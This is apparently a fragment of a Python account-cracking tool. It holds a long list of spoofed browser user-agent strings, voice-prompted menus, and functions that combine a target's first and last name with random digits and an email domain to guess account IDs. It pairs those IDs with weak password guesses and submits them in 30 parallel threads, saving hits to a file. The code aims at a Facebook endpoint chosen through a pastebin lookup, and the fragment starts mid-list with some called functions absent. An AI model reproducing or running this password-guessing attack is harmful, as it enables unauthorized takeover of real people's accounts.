6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.1.2 Yowser/2.5 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.1.2 Yowser/2.5 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.4693.80','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.4693.80','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/44.18363.8131','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44']

###################

def HANIF(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        
def play_audio(audio_file):
    from os import system as cmd
    try:
        cmd("play-audio "+audio_file)
    except:
        pass


def HANIF():
    logo()
    ttt()
    print("\n")
    print('\033[1;90m╔══[\033[1;92m\033[47m01\x1b[0m\033[1;90m] \033[1;97m𝑨𝑳𝑬𝑿𝑨 𝑪𝑹𝑨𝑪𝑲  ')
    print('\033[1;90m╠══[\033[1;92m\033[47m02\x1b[0m\033[1;90m] \033[1;90m𝑭𝒐𝒓 𝑴𝒐𝒓𝒆 𝑻𝒐𝒐𝒍')
    print('\033[1;90m╠══[\033[1;92m\033[47m03\x1b[0m\033[1;90m] \033[1;90m𝑭𝒐𝒍𝒍𝒐𝒘 𝑴𝒚 𝑮𝒓𝒐𝒖𝒑')
    print('\033[1;90m╚══[\033[1;90m\033[47m00\x1b[0m\033[1;90m]\033[1;94m 𝑬𝒙𝒊𝒕')
    create_audio("Hi sir ,I am ALEXA, I can Crack email","test.mp3")
    play_audio("test.mp3")
    opt = input('\n\x1b[1;32m╠/// 𝑪𝒉𝒐𝒐𝒔𝒆_\033[1;91m: \033[1;31m')
    if opt in ["1","01"]:
        _HANIF_("xdg-open https://www.facebook.com/groups/1181722475509853/?ref=share")
        create_audio("Starting","test2.mp3")
        play_audio("test2.mp3")
        menu()
    if opt in ["2","02"]:
        create_audio("Follow our group sir","test3.mp3")
        play_audio("test3.mp3")
        _HANIF_('xdg-open https://www.facebook.com/groups/1181437259174824/?ref=share')

    if opt in["3","03"]:
        create_audio("Follow our group sir","tes3.mp3")
        play_audio("tes3.mp3")
        
        _HANIF_('xdg-open https://www.facebook.com/groups/1181437259174824/?ref=share')
    if opt in["0","00"]:
        
        
        create_audio("good bye my boss ,I love you","test4.mp3")
        play_audio("test4.mp3")
        sys.exit()
        
    if opt not in ['h','H','r','R','O','o','n','N','e','E','1','2','3','4','5','01','02','03','04','0','6','06','00']:
        create_audio("choose the right option ","test5.mp3")
        play_audio("test5.mp3")
        HANIF()

def menu():
    _HANIF_('clear')
    logo()
    print("")
    print('\033[1;90m╔══[\033[1;91m\033[47m01\x1b[0m\033[1;90m] \033[1;97m𝑨𝒍𝒆𝒙𝒂 𝑵𝒂𝒎𝒆 𝑷𝒍𝒖𝒔 𝑵𝒖𝒎𝒃𝒆𝒓 ')
    print('\033[1;90m╠══[\033[1;92m\033[47m02\x1b[0m\033[1;90m] \033[1;97m𝑨𝒍𝒆𝒙𝒂 𝑵𝒂𝒎𝒆 𝑶𝒏𝒍𝒚 𝑷𝒂𝒔𝒔 ')
    print('\033[1;90m╠══[\033[1;93m\033[47m03\x1b[0m\033[1;90m] \033[1;97m𝑨𝒍𝒆𝒙𝒂 𝑴𝒊𝒙 𝑪𝒓𝒂𝒄𝒌')
    print('\033[1;90m╚══[\033[1;90m\033[47m00\x1b[0m\033[1;90m]\033[1;90m 𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖')
    pt = input('\n\x1b[1;32m╠ 𝑪𝑯𝑶𝑶𝑺𝑬#\033[1;91m: \033[1;31m')
    if pt in ["1","01"]:
        create_audio("baby you choose option one","test6.mp3")
        play_audio("test6.mp3")
        ha1()
    if pt in ["2","02"]:
        create_audio("baby you choose option 2","test7.mp3")
        play_audio("test7.mp3")
        ha2()
    if pt in ["3","03"]:
        create_audio("baby you choose mix I.D. Crack","test8.mp3")
        play_audio("test8.mp3")
        ha3()

    if pt in ["0","00"]:
        create_audio("good by baby ","tezst.mp3")
        play_audio("tezst.mp3")
        sys.exit()
    if pt not in ["0","00","1","01","2","02","3","03","4","04","5","05","6","06"]:
        create_audio("baby choose the right option  ,you can choose option one , option 2 , option 3 ,but you can not use any letter","test12.mp3")
        play_audio("test12.mp3")
        menu()

def ha1():
    user=[]
    os.system('clear')
    logo()
    print (" ")
    kode = input(' \x1b[1;90m[\x1b[1;91m/\x1b[1;90m] 𝑾𝒓𝒊𝒕𝒆 𝑭𝒊𝒓𝒔𝒕 𝑵𝒂𝒎𝒆: \x1b[1;91m')
    os.system('clear')
    logo()
    print("")
    kodex = input(' \x1b[1;90m[\x1b[1;91m/\x1b[1;90m] 𝑾𝒓𝒊𝒕𝒆 𝑳𝒂𝒔𝒕 𝑵𝒂𝒎𝒆:  \x1b[1;91m')
    os.system('clear')
    logo()
    print ("")
    print('\x1b[1;90m [\x1b[1;91m+\x1b[1;90m] 𝑬𝒙𝒂𝒎𝒑𝒍𝒆: \x1b[1;91m@gmail.com\x1b[1;90m, \x1b[1;91m@yahoo.com ')
    print("\033[1;32m \x1b[1;90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] Terget doamin :\x1b[1;91m ')
    
    os.system('clear')
    logo()
    print ("")
    print('\x1b[1;90m [\x1b[1;91m+\x1b[1;90m] 𝑬𝒙𝒂𝒎𝒑𝒍𝒆: \x1b[1;91m3000\x1b[1;90m, \x1b[1;91m5000\x1b[1;90m, \x1b[1;91m10000\x1b[1;90m, \x1b[1;91m50000 ')
    print("\033[1;30m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    create_audio("Dear choose limit ","limi.mp3")
    play_audio("limi.mp3")
    limit = int(input('[/] 𝑪𝒉𝒐𝒐𝒔𝒆: \x1b[1;91m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as _HANIF:
        os.system('clear')
        logo()
        tl = str(len(user))
        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")
        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')
        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')
        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")
        create_audio("cracking started, This line only for Haters, HANIF Afridi is back","start.mp3")
        play_audio("start.mp3")
        for mahi in user:
            uid = kode+kodex+mahi+doamin
            pwx = [kode+kodex+mahi,kode+mahi,kodex+mahi]
            _HANIF.submit(programmer_HANIF,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in 𝑨𝒍𝒆𝒙𝒂.txt')

def ha2():
    user=[]
    os.system('clear')
    logo()
    print (" ")
    kode = input(' \x1b[1;90m[\x1b[1;91m/\x1b[1;90m] 𝑾𝒓𝒊𝒕𝒆 𝑭𝒊𝒓𝒔𝒕 𝑵𝒂𝒎𝒆: \x1b[1;91m')
    os.system('clear')
    logo()
    print("")
    kodex = input(' \x1b[1;90m[\x1b[1;91m/\x1b[1;90m] 𝑾𝒓𝒊𝒕𝒆 𝑳𝒂𝒔𝒕 𝑵𝒂𝒎𝒆:  \x1b[1;91m')
    os.system('clear')
    logo()
    print ("")
    print('\x1b[1;90m [\x1b[1;91m+\x1b[1;90m] 𝑬𝒙𝒂𝒎𝒑𝒍𝒆: \x1b[1;91m@gmail.com\x1b[1;90m, \x1b[1;91m@yahoo.com ')
    print("\033[1;32m \x1b[1;90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] Terget doamin :\x1b[1;91m ')
    
    os.system('clear')
    logo()
    print ("")
    print('\x1b[1;90m [\x1b[1;91m+\x1b[1;90m] 𝑬𝒙𝒂𝒎𝒑𝒍𝒆: \x1b[1;91m3000\x1b[1;90m, \x1b[1;91m5000\x1b[1;90m, \x1b[1;91m10000\x1b[1;90m, \x1b[1;91m50000 ')
    print("\033[1;30m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    create_audio("Dear choose limit ","limi.mp3")
    play_audio("limi.mp3")
    limit = int(input('[/] 𝑪𝒉𝒐𝒐𝒔𝒆: \x1b[1;91m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as _HANIF:
        os.system('clear')
        logo()
        tl = str(len(user))
        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")
        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')
        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')
        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")
        create_audio("cracking started, This line only for Haters, HANIF Afridi is back","start.mp3")
        play_audio("start.mp3")
        for mahi in user:
            uid = kode+kodex+mahi+doamin
            pwx = [kode,kode+kodex,kodex+kode,kodex]
            _HANIF.submit(programmer_HANIF,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in 𝑨𝒍𝒆𝒙𝒂.txt')

def ha3():
    user=[]
    os.system('clear')
    logo()
    print (" ")
    kode = input(' \x1b[1;90m[\x1b[1;91m/\x1b[1;90m] 𝑾𝒓𝒊𝒕𝒆 𝑭𝒊𝒓𝒔𝒕 𝑵𝒂𝒎𝒆: \x1b[1;91m')
    os.system('clear')
    logo()
    print("")
    kodex = input(' \x1b[1;90m[\x1b[1;91m/\x1b[1;90m] 𝑾𝒓𝒊𝒕𝒆 𝑳𝒂𝒔𝒕 𝑵𝒂𝒎𝒆:  \x1b[1;91m')
    os.system('clear')
    logo()
    print ("")
    print('\x1b[1;90m [\x1b[1;91m+\x1b[1;90m] 𝑬𝒙𝒂𝒎𝒑𝒍𝒆: \x1b[1;91m@gmail.com\x1b[1;90m, \x1b[1;91m@yahoo.com ')
    print("\033[1;32m \x1b[1;90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] Terget doamin :\x1b[1;91m ')
    
    os.system('clear')
    logo()
    print ("")
    print('\x1b[1;90m [\x1b[1;91m+\x1b[1;90m] 𝑬𝒙𝒂𝒎𝒑𝒍𝒆: \x1b[1;91m3000\x1b[1;90m, \x1b[1;91m5000\x1b[1;90m, \x1b[1;91m10000\x1b[1;90m, \x1b[1;91m50000 ')
    print("\033[1;30m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    create_audio("Dear choose limit ","limi.mp3")
    play_audio("limi.mp3")
    limit = int(input('[/] 𝑪𝒉𝒐𝒐𝒔𝒆: \x1b[1;91m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as _HANIF:
        os.system('clear')
        logo()
        tl = str(len(user))
        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")
        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')
        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')
        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")
        create_audio("cracking started, This line only for Haters, HANIF Afridi is back","start.mp3")
        play_audio("start.mp3")
        for mahi in user:
            uid = kode+kodex+mahi+doamin
            pwx = [kode+kodex+mahi,kode+'##',kode+'@@',kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+mahi,kodex+mahi,kodex+'123',kodex+'1234',kodex+'12345',kodex+kode]
            _HANIF.submit(programmer_HANIF,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in 𝑨𝒍𝒆𝒙𝒂.txt')

HANIF_Brand=requests.get("https://pastebin.com/raw/E58uPwtm").text
if HANIF_Brand in ['free']:
	frist__link='https://free.facebook.com'
	HANIFboss='free.facebook.com'
